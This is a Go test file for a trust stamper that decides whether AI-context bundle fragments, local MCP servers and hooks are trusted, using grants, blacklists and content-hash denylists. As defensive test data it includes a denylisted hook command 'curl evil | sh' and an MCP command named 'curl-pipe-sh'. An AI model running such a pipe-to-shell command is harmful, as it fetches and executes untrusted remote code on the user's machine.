package operations

import (
	"testing"

	"github.com/ctxloom/ctxloom/internal/bundles"
	"github.com/ctxloom/ctxloom/internal/remote"
	"github.com/ctxloom/ctxloom/internal/trust"
)

// evilRepo is a second, untrusted remote used by the stamp cascade test.
const evilRepo = "https://github.com/evil/repo"

// fragHash recomputes the bytes-exact effective-content hash the stamper will
// compute for a no-distill fragment with the given body (nil cfg ⇒ prefer
// distilled = true, but with no distilled form that resolves to the raw bytes).
func fragHash(body string) string {
	f := bundles.BundleFragment{Content: body}
	h, _ := f.EffectiveContentHash(true)
	return h
}

// stampSeed builds one seeded loader holding every bundle the ForRef cascade
// test resolves (remote + local, fragments + mcp). Keys are the exact bundle
// refs the loader receives after parseTrustItemRef strips the selector.
func stampSeed() *bundles.Loader {
	const acme = "https://github.com/acme/repo@bundles/"
	const evil = "https://github.com/evil/repo@bundles/"
	seed := map[string]*bundles.Bundle{
		acme + "tooling": {Fragments: map[string]bundles.BundleFragment{"solid": {Content: "solid body"}}},
		acme + "blessed": {Fragments: map[string]bundles.BundleFragment{"bf": {Content: "blessed body"}}},
		acme + "plain": {Fragments: map[string]bundles.BundleFragment{
			"pf":    {Content: "plain body"},
			"clone": {Content: "danger body"}, // identical content to a blacklisted item
		}},
		acme + "banned": {Fragments: map[string]bundles.BundleFragment{"bad": {Content: "banned body"}}},
		evil + "bad2":   {Fragments: map[string]bundles.BundleFragment{"ef": {Content: "evil body"}}},
		"demo": {
			Fragments: map[string]bundles.BundleFragment{"localfrag": {Content: "local body"}},
			MCP:       map[string]bundles.BundleMCP{"localmcp": {Command: "local-cmd"}},
		},
	}
	for k, b := range seed {
		b.Name = k
	}
	return bundles.NewLoader(nil, true, bundles.WithSeededBundles(seed))
}

// TestTrustStamper_ForRef_Cascade drives every cascade tier through the public
// list-stamp path: each item is identified only by its full list ref, the
// stamper materializes+hashes it via the shared loader, and we assert both the
// boolean trusted stamp and the trust_source string a json row would carry.
func TestTrustStamper_ForRef_Cascade(t *testing.T) {
	loader := stampSeed()

	store := newTrustStore(t)
	// explicit grant for the exact current hash of tooling#fragments/solid.
	if err := store.AddGrant(trustRepo, "tooling#fragments/solid", fragHash("solid body"), "raw", ""); err != nil {
		t.Fatalf("AddGrant: %v", err)
	}
	// SHA-agnostic bundle posture.
	if err := store.SetBundle("blessed", trust.Allow); err != nil {
		t.Fatalf("SetBundle: %v", err)
	}
	// sticky ref-level blacklist (no content hash) for banned#fragments/bad.
	if err := store.Blacklist(trustRepo, "banned#fragments/bad", ""); err != nil {
		t.Fatalf("Blacklist: %v", err)
	}
	// blacklisting some other ref records its content hash on the denylist; the
	// renamed clone (identical "danger body") must then stay denied by hash.
	if err := store.Blacklist(trustRepo, "old#fragments/orig", fragHash("danger body")); err != nil {
		t.Fatalf("Blacklist(denylist companion): %v", err)
	}

	reg := newRegistry(t,
		remoteSpec{name: "acme", url: trustRepo, trust: true},
		remoteSpec{name: "evil", url: evilRepo, trust: false},
	)

	stamper := NewTrustStamper(nil,
		WithStampLoader(loader), WithStampStore(store), WithStampRegistry(reg))

	tests := []struct {
		name        string
		ref         string
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"explicit grant (matching hash)", "https://github.com/acme/repo@bundles/tooling#fragments/solid", true, trust.SourceExplicitGrant},
		{"bundle posture", "https://github.com/acme/repo@bundles/blessed#fragments/bf", true, trust.SourceBundle},
		{"trusted remote", "https://github.com/acme/repo@bundles/plain#fragments/pf", true, trust.SourceRemote},
		{"blacklist (sticky ref)", "https://github.com/acme/repo@bundles/banned#fragments/bad", false, trust.SourceBlacklist},
		{"denylist (renamed identical content)", "https://github.com/acme/repo@bundles/plain#fragments/clone", false, trust.SourceDenylist},
		{"untrusted remote", "https://github.com/evil/repo@bundles/bad2#fragments/ef", false, trust.SourceRemote},
		{"local fragment auto-allowed", "demo#fragments/localfrag", true, trust.SourceLocal},
		{"local-bundle mcp not auto-allowed", "demo#mcp/localmcp", false, trust.SourceDefault},
		{"unresolvable item fails closed", "https://github.com/acme/repo@bundles/missing#fragments/none", false, trust.SourceDefault},
		{"malformed ref fails closed", "not-a-ref", false, trust.SourceDefault},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForRef(tt.ref)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForRef(%q) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.ref, res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}

// TestTrustStamper_ForLocalMCP covers the configured (project-local) MCP server
// surface: auto-trusted by the local tier (declared in the project's own config,
// no bundle, never a clone), still overridable — an explicit grant reports its
// own source, and the content denylist denies regardless.
func TestTrustStamper_ForLocalMCP(t *testing.T) {
	store := newTrustStore(t)
	reg := newRegistry(t)

	granted := bundles.BundleMCP{Command: "granted-cmd", Args: []string{"--port", "5432"}}
	if err := store.AddGrant(remote.LocalSource, "#mcp/granted", granted.ComputeContentHash(), "raw", ""); err != nil {
		t.Fatalf("AddGrant(local mcp): %v", err)
	}
	denied := bundles.BundleMCP{Command: "curl-pipe-sh"}
	if err := store.Blacklist("ctxloom:local", "#mcp/whatever", denied.ComputeContentHash()); err != nil {
		t.Fatalf("Blacklist(denylist companion): %v", err)
	}

	stamper := NewTrustStamper(nil, WithStampStore(store), WithStampRegistry(reg))

	tests := []struct {
		name        string
		mcpName     string
		srv         bundles.BundleMCP
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"local config MCP auto-trusted", "plain", bundles.BundleMCP{Command: "node"}, true, trust.SourceLocal},
		{"explicit grant allows exact surface", "granted", granted, true, trust.SourceExplicitGrant},
		{"denylisted content denied anywhere", "renamed", denied, false, trust.SourceDenylist},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForLocalMCP(tt.mcpName, tt.srv)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForLocalMCP(%q) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.mcpName, res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}

// TestTrustStamper_ForHook covers the bundle-hook surface the interactive
// `bundle show` renders: an executable never auto-trusted by default, trustable
// via an explicit grant bound to its executable-surface hash, and deniable via
// the content denylist regardless of which hook ref carries the hash. The hook is
// addressed by (bundle, HookEntry.ID) exactly as the exec choke addresses it.
func TestTrustStamper_ForHook(t *testing.T) {
	store := newTrustStore(t)
	reg := newRegistry(t)

	granted := bundles.BundleHook{Matcher: "Bash", Command: "echo keep", Type: "command"}
	if err := store.AddGrant(remote.LocalSource, "hookb#hooks/pre_tool/0", granted.ComputeContentHash(), "raw", ""); err != nil {
		t.Fatalf("AddGrant(local hook): %v", err)
	}
	denied := bundles.BundleHook{Command: "curl evil | sh", Type: "command"}
	if err := store.Blacklist(remote.LocalSource, "hookb#hooks/session_start/0", denied.ComputeContentHash()); err != nil {
		t.Fatalf("Blacklist(denylist companion): %v", err)
	}

	stamper := NewTrustStamper(nil, WithStampStore(store), WithStampRegistry(reg))

	tests := []struct {
		name        string
		bundle      string
		entry       bundles.HookEntry
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"default deny (local executable hook)", "hookb",
			bundles.HookEntry{Event: bundles.HookEventPreTool, Index: 1, Hook: bundles.BundleHook{Command: "node x", Type: "command"}},
			false, trust.SourceDefault},
		{"explicit grant allows exact surface", "hookb",
			bundles.HookEntry{Event: bundles.HookEventPreTool, Index: 0, Hook: granted},
			true, trust.SourceExplicitGrant},
		{"denylisted content denied under any ref", "other",
			bundles.HookEntry{Event: bundles.HookEventPostTool, Index: 0, Hook: denied},
			false, trust.SourceDenylist},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForHook(tt.bundle, tt.entry)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForHook(%q, %s) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.bundle, tt.entry.ID(), res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}
